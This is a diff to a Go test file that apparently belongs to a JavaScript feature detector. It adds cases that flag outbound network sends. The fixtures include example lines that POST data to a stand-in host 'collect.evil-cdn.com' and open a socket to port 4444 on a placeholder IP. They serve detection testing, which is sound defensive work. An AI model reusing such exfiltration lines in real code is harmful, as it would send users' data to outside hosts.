@@ -80,6 +80,11 @@ func TestJSFeatures(t *testing.T) {
 		{"method named fetch", `store.fetch(id);`, core.FSend, "*", nil, false},
 		{"own helper", `myFetch(u);`, core.FSend, "*", nil, false},
 		{"commented fetch", `// fetch(u)`, core.FSend, "*", nil, false},
+		{"fetch host", `fetch('https://collect.evil-cdn.com/x', { method: 'POST', body });`, core.FSend, "fetch",
+			map[string]string{"host": "collect.evil-cdn.com", "domain": "evil-cdn.com"}, true},
+		{"socket host", `const net = require('net'); net.connect(4444, '198.51.100.7');`, core.FSend, "net.connect",
+			map[string]string{"host": "198.51.100.7"}, true},
+		{"fetch built host", `fetch(base + '/x', { body });`, core.FSend, "fetch", map[string]string{"host": ""}, true},
 
 		// FEval.
 		{"eval", `eval(x);`, core.FEval, "eval", map[string]string{"arg": "dynamic"}, true},
